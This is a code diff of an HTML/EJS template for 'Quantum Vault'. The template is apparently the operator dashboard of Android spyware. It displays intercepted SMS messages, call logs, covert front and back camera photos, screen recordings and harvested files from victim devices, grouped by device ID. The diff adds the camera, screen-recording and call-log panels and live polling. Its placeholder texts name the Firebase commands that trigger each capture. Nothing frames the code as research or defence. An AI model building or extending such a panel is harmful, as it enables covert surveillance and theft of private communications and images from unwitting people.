@@ -7,197 +7,211 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
-            color: #f8fafc;
-            min-height: 100vh;
-            margin: 0;
-            padding: 0;
-        }
-
-        .glass-panel {
-            background: rgba(255, 255, 255, 0.03);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            border-radius: 1.5rem;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
-        }
-
-        .glass-panel:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 35px 60px -15px rgba(0, 0, 0, 0.6);
-        }
-
-        .glow-text {
-            text-shadow: 0 0 20px rgba(139, 92, 246, 0.5);
-        }
-        
-        .tab-btn {
-            background: rgba(255, 255, 255, 0.05);
-            transition: all 0.3s ease;
-        }
-        
-        .tab-btn.active {
-            background: rgba(139, 92, 246, 0.4);
-            border-color: rgba(167, 139, 250, 0.5);
-            box-shadow: 0 0 15px rgba(139, 92, 246, 0.3);
-        }
-
-        .custom-scrollbar::-webkit-scrollbar {
-            width: 8px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-track {
-            background: rgba(0,0,0,0.1);
-            border-radius: 4px;
-        }
-        .custom-scrollbar::-webkit-scrollbar-thumb {
-            background: rgba(255,255,255,0.1);
-            border-radius: 4px;
-        }
-
-        .animate-fade-in {
-            animation: fadeIn 0.4s ease-out forwards;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
+        body { font-family: 'Inter', sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%); color: #f8fafc; min-height: 100vh; margin: 0; }
+        .glass { background: rgba(255,255,255,0.03); backdrop-filter: blur(16px); border: 1px solid rgba(255,255,255,0.06); border-radius: 1.25rem; box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
+        .tab-btn { background: rgba(255,255,255,0.05); transition: all .25s; }
+        .tab-btn.active { background: rgba(139,92,246,0.35); border-color: rgba(167,139,250,0.5); box-shadow: 0 0 14px rgba(139,92,246,0.3); }
+        .entry { background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.07); border-radius: .75rem; transition: background .2s; }
+        .entry:hover { background: rgba(255,255,255,0.09); }
+        .badge { display:inline-block; font-size:.7rem; padding:.15rem .5rem; border-radius:999px; font-weight:700; }
+        .scrollarea { max-height: 78vh; overflow-y: auto; }
+        .scrollarea::-webkit-scrollbar { width:6px; }
+        .scrollarea::-webkit-scrollbar-thumb { background:rgba(255,255,255,.1); border-radius:4px; }
+        .live-dot { width:8px; height:8px; border-radius:50%; background:#22c55e; animation: pulse 1.5s infinite; display:inline-block; margin-right:5px; }
+        @keyframes pulse { 0%,100%{opacity:1}50%{opacity:.3} }
+        video { width:100%; border-radius:.5rem; max-height:200px; }
+        img.thumb { width:100%; border-radius:.5rem; max-height:200px; object-fit:cover; }
     </style>
 </head>
 <body class="p-4 md:p-8">
+<div class="max-w-7xl mx-auto">
 
-    <div class="max-w-7xl mx-auto">
-        <!-- Header -->
-        <header class="flex justify-between items-center mb-10 animate-fade-in">
-            <div>
-                <h1 class="text-4xl font-bold tracking-tight text-transparent bg-clip-text bg-gradient-to-r from-violet-400 to-indigo-400 glow-text mb-2">
-                    Quantum Vault
-                </h1>
-                <p class="text-slate-400 text-sm">Real-time OS Vulnerability Dashboard</p>
+    <!-- Header -->
+    <header class="flex flex-wrap justify-between items-center mb-8 gap-4">
+        <div>
+            <h1 class="text-3xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-violet-400 to-indigo-400">
+                Quantum Vault <span class="text-slate-400 font-light text-lg">Research Dashboard</span>
+            </h1>
+            <p class="text-slate-500 text-xs mt-1"><span class="live-dot"></span>Live — auto-refreshes every 5s</p>
+        </div>
+        <div class="flex flex-wrap gap-2">
+            <button onclick="switchTab('texts')"      id="tab-texts"      class="tab-btn active px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">Logs</button>
+            <button onclick="switchTab('sms')"        id="tab-sms"        class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">SMS</button>
+            <button onclick="switchTab('calls')"      id="tab-calls"      class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">Call Logs</button>
+            <button onclick="switchTab('cameras')"    id="tab-cameras"    class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">📷 Camera</button>
+            <button onclick="switchTab('screen')"     id="tab-screen"     class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">🎬 Screen</button>
+            <button onclick="switchTab('files')"      id="tab-files"      class="tab-btn px-4 py-1.5 rounded-full border border-white/10 text-sm font-semibold">Files</button>
+        </div>
+    </header>
+
+    <!-- ── TEXT LOGS ── -->
+    <section id="sec-texts" class="glass p-6 scrollarea">
+        <div class="flex justify-between items-center mb-5">
+            <h2 class="text-xl font-semibold text-violet-300">Activity Logs</h2>
+            <span id="count-texts" class="badge bg-violet-900/60 text-violet-300 border border-violet-500/30"><%= data.texts.length %> entries</span>
+        </div>
+        <div id="list-texts" class="space-y-3">
+            <% if(data.texts.length === 0) { %><p class="text-slate-500 italic text-center py-10">No logs yet.</p><% } %>
+            <% data.texts.forEach(function(item){ %>
+            <div class="entry p-4">
+                <div class="flex justify-between items-center mb-1">
+                    <span class="badge bg-emerald-900/60 text-emerald-400 border border-emerald-500/30"><%= item.type %></span>
+                    <span class="text-xs text-slate-500"><%= item.deviceId %> · <%= item.timestamp %></span>
+                </div>
+                <p class="text-slate-200 text-sm break-words whitespace-pre-wrap mt-2"><%= item.data %></p>
             </div>
-            
-            <div class="flex gap-4">
-                <button onclick="switchTab('texts')" id="tab-texts" class="tab-btn active px-6 py-2 rounded-full border border-white/10 text-sm font-semibold">Logs & Texts</button>
-                <button onclick="switchTab('sms')" id="tab-sms" class="tab-btn px-6 py-2 rounded-full border border-white/10 text-sm font-semibold">SMS Intercepts</button>
-                <button onclick="switchTab('files')" id="tab-files" class="tab-btn px-6 py-2 rounded-full border border-white/10 text-sm font-semibold">File Uploads</button>
+            <% }); %>
+        </div>
+    </section>
+
+    <!-- ── SMS ── -->
+    <section id="sec-sms" class="glass p-6 scrollarea hidden">
+        <div class="flex justify-between items-center mb-5">
+            <h2 class="text-xl font-semibold text-blue-300">SMS Intercepts</h2>
+            <span id="count-sms" class="badge bg-blue-900/60 text-blue-300 border border-blue-500/30"><%= data.sms.length %> messages</span>
+        </div>
+        <div id="list-sms" class="space-y-3">
+            <% if(data.sms.length === 0) { %><p class="text-slate-500 italic text-center py-10">No SMS captured yet.</p><% } %>
+            <% data.sms.forEach(function(sms){ %>
+            <div class="entry p-4 flex gap-4">
+                <div class="h-9 w-9 flex-shrink-0 flex items-center justify-center rounded-full bg-gradient-to-br from-blue-500 to-indigo-600">
+                    <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"/></svg>
+                </div>
+                <div class="flex-1">
+                    <div class="flex justify-between items-center">
+                        <span class="font-semibold text-slate-200 text-sm"><%= sms.sender %></span>
+                        <span class="text-xs text-slate-500"><%= sms.deviceId %> · <%= sms.timestamp %></span>
+                    </div>
+                    <p class="text-slate-300 text-sm mt-1 whitespace-pre-wrap"><%= sms.message %></p>
+                </div>
             </div>
-        </header>
+            <% }); %>
+        </div>
+    </section>
 
-        <!-- Content Area -->
-        <main class="grid grid-cols-1 gap-8">
-            
-            <!-- TEXT LOGS SECTION -->
-            <section id="sec-texts" class="glass-panel p-6 w-full animate-fade-in custom-scrollbar" style="max-height: 80vh; overflow-y: auto;">
-                <div class="flex items-center justify-between mb-6">
-                    <h2 class="text-2xl font-semibold text-violet-300">Text Activity Logs</h2>
-                    <span class="bg-violet-900/50 text-violet-300 py-1 px-3 rounded-full text-xs border border-violet-500/30 w-fit"><%= data.texts.length %> Entries</span>
+    <!-- ── CALL LOGS ── -->
+    <section id="sec-calls" class="glass p-6 scrollarea hidden">
+        <div class="flex justify-between items-center mb-5">
+            <h2 class="text-xl font-semibold text-teal-300">Call Logs</h2>
+            <span id="count-calls" class="badge bg-teal-900/60 text-teal-300 border border-teal-500/30"><%= data.call_logs.length %> uploads</span>
+        </div>
+        <div id="list-calls" class="space-y-4">
+            <% if(data.call_logs.length === 0) { %><p class="text-slate-500 italic text-center py-10">No call logs yet. Send Firebase command: extract_call_logs</p><% } %>
+            <% data.call_logs.forEach(function(batch){ %>
+            <div class="entry p-4">
+                <div class="flex justify-between items-center mb-3">
+                    <span class="badge bg-teal-900/60 text-teal-300 border border-teal-500/30">Call Log Batch</span>
+                    <span class="text-xs text-slate-500"><%= batch.deviceId %> · <%= batch.timestamp %></span>
                 </div>
-                
-                <div class="space-y-4">
-                    <% if(data.texts.length === 0) { %>
-                        <p class="text-slate-500 italic text-center py-10">No logs intercepted yet.</p>
-                    <% } %>
-                    <% data.texts.forEach(function(item) { %>
-                    <div class="bg-white/5 border border-white/10 p-5 rounded-xl hover:bg-white/10 transition-colors">
-                        <div class="flex justify-between items-center mb-2">
-                            <span class="text-xs font-bold uppercase tracking-wider text-emerald-400"><%= item.type %></span>
-                            <span class="text-xs text-slate-500"><%= item.timestamp %></span>
-                        </div>
-                        <p class="text-slate-200 text-sm break-words whitespace-pre-wrap"><%= item.data %></p>
-                        <p class="text-xs text-slate-600 mt-3 text-right">Device IP/ID: <%= item.deviceId %></p>
+                <% try { var calls = JSON.parse(batch.data); } catch(e) { var calls = []; } %>
+                <div class="space-y-2">
+                <% calls.forEach(function(c){ %>
+                    <div class="flex justify-between text-sm bg-black/20 rounded-lg p-2">
+                        <span class="text-slate-300"><%= c.name || c.number %> <span class="text-slate-500 text-xs">(<%= c.number %>)</span></span>
+                        <span class="badge <%= c.type==='INCOMING'?'bg-green-900/60 text-green-400':c.type==='OUTGOING'?'bg-blue-900/60 text-blue-400':'bg-red-900/60 text-red-400' %>"><%= c.type %></span>
+                        <span class="text-slate-500 text-xs"><%= c.duration_sec %>s</span>
                     </div>
-                    <% }); %>
+                <% }); %>
                 </div>
-            </section>
+            </div>
+            <% }); %>
+        </div>
+    </section>
 
-            <!-- SMS LOGS SECTION -->
-            <section id="sec-sms" class="glass-panel p-6 w-full animate-fade-in custom-scrollbar hidden" style="max-height: 80vh; overflow-y: auto;">
-                <div class="flex items-center justify-between mb-6">
-                    <h2 class="text-2xl font-semibold text-blue-300">SMS Intercepts</h2>
-                    <span class="bg-blue-900/50 text-blue-300 py-1 px-3 rounded-full text-xs border border-blue-500/30 w-fit"><%= data.sms.length %> Messages</span>
-                </div>
-                
-                <div class="space-y-4">
-                    <% if(data.sms.length === 0) { %>
-                        <p class="text-slate-500 italic text-center py-10">No incoming SMS captured yet.</p>
-                    <% } %>
-                    <% data.sms.forEach(function(sms) { %>
-                    <div class="bg-white/5 border border-white/10 p-5 rounded-xl flex gap-4 hover:bg-white/10 transition-colors">
-                        <div class="h-10 w-10 flex items-center justify-center rounded-full bg-gradient-to-br from-blue-500 to-indigo-600 shadow-lg shadow-blue-500/20 flex-shrink-0">
-                            <svg class="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
-                        </div>
-                        <div class="w-full">
-                            <div class="flex justify-between items-center mb-1">
-                                <h3 class="font-semibold text-slate-200"><%= sms.sender %></h3>
-                                <span class="text-xs text-slate-500"><%= sms.timestamp %></span>
-                            </div>
-                            <p class="text-slate-300 text-sm whitespace-pre-wrap"><%= sms.message %></p>
-                            <p class="text-xs text-slate-600 mt-2 text-right">Original TS: <%= sms.original_timestamp %></p>
-                        </div>
-                    </div>
-                    <% }); %>
-                </div>
-            </section>
+    <!-- ── CAMERA PHOTOS ── -->
+    <section id="sec-cameras" class="glass p-6 scrollarea hidden">
+        <div class="flex justify-between items-center mb-5">
+            <h2 class="text-xl font-semibold text-orange-300">📷 Camera Photos</h2>
+            <% var camFiles = data.files.filter(function(f){return f.type==='front_photos'||f.type==='back_photos';}); %>
+            <span id="count-cameras" class="badge bg-orange-900/60 text-orange-300 border border-orange-500/30"><%= camFiles.length %> photos</span>
+        </div>
+        <div id="list-cameras" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
+            <% if(camFiles.length===0){ %><p class="text-slate-500 italic text-center py-10 col-span-full">No camera captures yet. Send Firebase: front_photo / back_photo</p><% } %>
+            <% camFiles.forEach(function(f){ %>
+            <a href="<%= f.path %>" target="_blank" class="entry p-2 block">
+                <img src="<%= f.path %>" alt="<%= f.filename %>" class="thumb" onerror="this.style.display='none'">
+                <p class="text-xs text-slate-400 mt-1 truncate"><%= f.type === 'front_photos' ? '🤳 Front' : '📸 Back' %> · <%= f.timestamp %></p>
+                <p class="text-xs text-slate-600 truncate"><%= f.deviceId %></p>
+            </a>
+            <% }); %>
+        </div>
+    </section>
 
-            <!-- MEDIA / FILES SECTION -->
-            <section id="sec-files" class="glass-panel p-6 w-full animate-fade-in hidden custom-scrollbar" style="max-height: 80vh; overflow-y: auto;">
-                 <div class="flex items-center justify-between mb-6">
-                    <h2 class="text-2xl font-semibold text-pink-300">Harvested Media & Files</h2>
-                    <span class="bg-pink-900/50 text-pink-300 py-1 px-3 rounded-full text-xs border border-pink-500/30 w-fit"><%= data.files.length %> Files</span>
-                </div>
-                
-                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-                    <% if(data.files.length === 0) { %>
-                        <p class="text-slate-500 italic col-span-full text-center py-10">No files uploaded yet.</p>
-                    <% } %>
-                    <% data.files.forEach(function(f) { %>
-                    <a href="<%= f.path %>" target="_blank" class="block bg-white/5 border border-white/10 p-5 rounded-xl hover:bg-white/10 hover:border-pink-500/50 transition-all group">
-                        <div class="flex justify-between items-start mb-4">
-                            <div class="px-2 py-1 rounded bg-black/30 border border-white/5 text-xs text-pink-300 uppercase tracking-widest"><%= f.type %></div>
-                            <span class="text-xs text-slate-500"><%= f.timestamp %></span>
-                        </div>
-                        
-                        <div class="h-24 w-full bg-black/20 rounded-lg flex items-center justify-center mb-4 group-hover:bg-black/40 transition-colors">
-                            <% if (f.type === 'photos') { %>
-                                <svg class="w-8 h-8 text-slate-400 group-hover:text-pink-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
-                            <% } else if (f.type === 'audios') { %>
-                                <svg class="w-8 h-8 text-slate-400 group-hover:text-pink-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
-                            <% } else if (f.type === 'videos') { %>
-                                <svg class="w-8 h-8 text-slate-400 group-hover:text-pink-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                            <% } else { %>
-                                <svg class="w-8 h-8 text-slate-400 group-hover:text-pink-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path></svg>
-                            <% } %>
-                        </div>
-                        
-                        <p class="text-sm font-medium text-slate-200 truncate" title="<%= f.filename %>"><%= f.filename %></p>
-                        <p class="text-xs text-slate-500 mt-1">Click to view/download</p>
-                    </a>
-                    <% }); %>
-                </div>
-            </section>
-        </main>
-    </div>
+    <!-- ── SCREEN RECORDINGS ── -->
+    <section id="sec-screen" class="glass p-6 scrollarea hidden">
+        <div class="flex justify-between items-center mb-5">
+            <h2 class="text-xl font-semibold text-pink-300">🎬 Screen Recordings</h2>
+            <% var recFiles = data.files.filter(function(f){return f.type==='screen_recordings';}); %>
+            <span id="count-screen" class="badge bg-pink-900/60 text-pink-300 border border-pink-500/30"><%= recFiles.length %> recordings</span>
+        </div>
+        <div id="list-screen" class="grid grid-cols-1 md:grid-cols-2 gap-5">
+            <% if(recFiles.length===0){ %><p class="text-slate-500 italic text-center py-10 col-span-full">No screen recordings yet. Send Firebase: record_screen</p><% } %>
+            <% recFiles.forEach(function(f){ %>
+            <div class="entry p-4">
+                <video controls src="<%= f.path %>"></video>
+                <p class="text-xs text-slate-400 mt-2"><%= f.filename %></p>
+                <p class="text-xs text-slate-600"><%= f.deviceId %> · <%= f.timestamp %></p>
+            </div>
+            <% }); %>
+        </div>
+    </section>
 
-    <!-- Tab Switching Logic -->
-    <script>
-        function switchTab(tabId) {
-            // Update buttons
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            document.getElementById('tab-' + tabId).classList.add('active');
+    <!-- ── ALL FILES ── -->
+    <section id="sec-files" class="glass p-6 scrollarea hidden">
+        <div class="flex justify-between items-center mb-5">
+            <h2 class="text-xl font-semibold text-slate-300">All Uploaded Files</h2>
+            <span id="count-files" class="badge bg-slate-700 text-slate-300 border border-slate-600"><%= data.files.length %> files</span>
+        </div>
+        <div id="list-files" class="grid grid-cols-1 md:grid-cols-3 gap-4">
+            <% if(data.files.length===0){ %><p class="text-slate-500 italic text-center py-10 col-span-full">No files uploaded yet.</p><% } %>
+            <% data.files.forEach(function(f){ %>
+            <a href="<%= f.path %>" target="_blank" class="entry p-4 block hover:border-pink-500/40">
+                <div class="flex justify-between mb-3">
+                    <span class="badge bg-black/40 text-pink-300 border border-white/5 uppercase tracking-widest"><%= f.type %></span>
+                    <span class="text-xs text-slate-500"><%= f.timestamp %></span>
+                </div>
+                <p class="text-sm text-slate-200 truncate"><%= f.filename %></p>
+                <p class="text-xs text-slate-600 mt-1"><%= f.deviceId %></p>
+            </a>
+            <% }); %>
+        </div>
+    </section>
 
-            // Update sections
-            document.querySelectorAll('main > section').forEach(sec => sec.classList.add('hidden'));
-            document.getElementById('sec-' + tabId).classList.remove('hidden');
-        }
-        
-        // Auto refresh every 10 seconds to fetch new data
-        setTimeout(() => {
-            window.location.reload();
-        }, 10000);
-    </script>
+</div>
+
+<script>
+// ── Tab switching ─────────────────────────────────────────────
+const TABS = ['texts','sms','calls','cameras','screen','files'];
+function switchTab(id) {
+    TABS.forEach(t => {
+        document.getElementById('tab-'+t).classList.toggle('active', t===id);
+        document.getElementById('sec-'+t).classList.toggle('hidden', t!==id);
+    });
+    window._activeTab = id;
+}
+window._activeTab = 'texts';
+
+// ── Live polling every 5s (no full page reload) ───────────────
+function liveRefresh() {
+    fetch('/api/data')
+        .then(r => r.json())
+        .then(d => {
+            updateBadge('texts',  d.texts.length);
+            updateBadge('sms',    d.sms.length);
+            updateBadge('calls',  d.call_logs.length);
+            const camCount = d.files.filter(f=>f.type==='front_photos'||f.type==='back_photos').length;
+            const recCount = d.files.filter(f=>f.type==='screen_recordings').length;
+            updateBadge('cameras', camCount);
+            updateBadge('screen',  recCount);
+            updateBadge('files',   d.files.length);
+        })
+        .catch(() => {}); // silently ignore network errors
+}
+function updateBadge(tab, count) {
+    const el = document.getElementById('count-'+tab);
+    if (el) el.textContent = count + (tab==='sms'?' messages':tab==='files'?' files':tab==='calls'?' uploads':' entries');
+}
+setInterval(liveRefresh, 5000);
+</script>
 </body>
 </html>
